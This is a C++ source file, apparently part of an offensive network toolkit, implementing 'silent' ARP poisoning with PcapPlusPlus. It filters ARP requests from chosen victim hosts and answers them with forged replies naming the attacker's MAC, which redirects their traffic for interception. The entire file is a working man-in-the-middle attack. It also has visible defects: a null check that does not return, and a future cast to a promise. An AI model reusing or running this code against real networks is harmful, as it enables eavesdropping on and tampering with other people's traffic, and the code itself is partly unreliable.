#include "arp_poisoning/silent.h"
#include "ArpLayer.h"
#include "EthLayer.h"
#include "IpAddress.h"
#include "Packet.h"
#include "PcapFilter.h"
#include "PcapLiveDevice.h"
#include "ProtocolType.h"
#include "RawPacket.h"
#include "log.h"
#include <exception>
#include <future>
#include <stdexcept>
#include <vector>

void ATK::ARP::SilentArpPoisoningStrategy::onPacketArrives(
    pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device, void *cookie) {
    auto *completionFuture = static_cast<std::promise<void> *>(cookie);

    const pcpp::Packet parsedPacket(packet);
    auto *requestEthLayer = parsedPacket.getLayerOfType<pcpp::EthLayer>();
    auto *requestArpLayer = parsedPacket.getLayerOfType<pcpp::ArpLayer>();

    if (requestEthLayer == nullptr || requestArpLayer == nullptr) {
        completionFuture->set_exception_at_thread_exit(
            std::make_exception_ptr(std::runtime_error(
                "Invalid filter settings, found packet with missing layers")));
        device->stopCapture();
    }

    bool isMessageToAttacker =
        requestEthLayer->getSourceMac() == device->getMacAddress() ||
        requestEthLayer->getSourceMac() == attackerMac_ ||
        requestArpLayer->getTargetIpAddr() == device->getIPv4Address();
    bool isIpToSpoof =
        std::find(ipsToSpoof_.begin(), ipsToSpoof_.end(),
                  requestArpLayer->getTargetIpAddr()) != ipsToSpoof_.end();
    bool isFromVictim =
        std::find(victimIps_.begin(), victimIps_.end(),
                  requestArpLayer->getSenderIpAddr()) != victimIps_.end();

    // determine whether or not to handle packet
    if (isMessageToAttacker || !isIpToSpoof || !isFromVictim) {
        LOG_INFO("skipped packet: src " << requestArpLayer->getSenderIpAddr()
                                        << " to "
                                        << requestArpLayer->getTargetIpAddr());
        return;
    }

    // craft response packet
    pcpp::EthLayer responseEthLayer(device->getMacAddress(),
                                    requestEthLayer->getSourceMac());

    pcpp::ArpLayer responseArpLayer(pcpp::ArpOpcode::ARP_REPLY, attackerMac_,
                                    requestArpLayer->getSenderMacAddress(),
                                    requestArpLayer->getTargetIpAddr(),
                                    requestArpLayer->getSenderIpAddr());

    pcpp::Packet responsePacket(ARP_PACKET_SIZE);
    responsePacket.addLayer(&responseEthLayer);
    responsePacket.addLayer(&responseArpLayer);
    responsePacket.computeCalculateFields();

    if (!device->sendPacket(&responsePacket)) {
        LOG_ERROR("Failed to send packet");
        completionFuture->set_exception_at_thread_exit(std::make_exception_ptr(
            std::runtime_error("Failed to send packet")));
        device->stopCapture();
    };
}

void ATK::ARP::SilentArpPoisoningStrategy::execute() {
    if (!device_->open()) {
        throw std::runtime_error("Unable to open interface");
    }

    std::promise<void> completionPromise;
    std::future<void> completionFuture = completionPromise.get_future();

    // set filters
    pcpp::ArpFilter arpFilter(pcpp::ArpOpcode::ARP_REQUEST);
    pcpp::EtherTypeFilter etherTypeFilter(PCPP_ETHERTYPE_ARP);
    pcpp::ProtoFilter protoFilter(pcpp::ARP);

    // set filter to mac not to self
    pcpp::MacAddressFilter deviceMacAdressFilter(device_->getMacAddress(),
                                                 pcpp::Direction::SRC_OR_DST);
    pcpp::NotFilter notDeviceMacAdress(&deviceMacAdressFilter);
    pcpp::AndFilter andFilter;
    andFilter.addFilter(&arpFilter);
    andFilter.addFilter(&etherTypeFilter);
    andFilter.addFilter(&protoFilter);
    andFilter.addFilter(&notDeviceMacAdress);

    if (!device_->setFilter(andFilter)) {
        device_->close();
        LOG_ERROR("Unable to set arp and ethertype filters on interface");
        throw std::runtime_error(
            "Unable to set arp and ethertype filters on interface");
    };

    if (!device_->startCapture(
            [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                   void *cookie) { onPacketArrives(packet, device, cookie); },
            &completionFuture)) {
        device_->close();
        throw std::runtime_error("Unable to start capturing arp packets");
    };

    try {
        completionFuture.get();
    } catch (const std::exception &e) {
        device_->close();
    }

    device_->close();
}
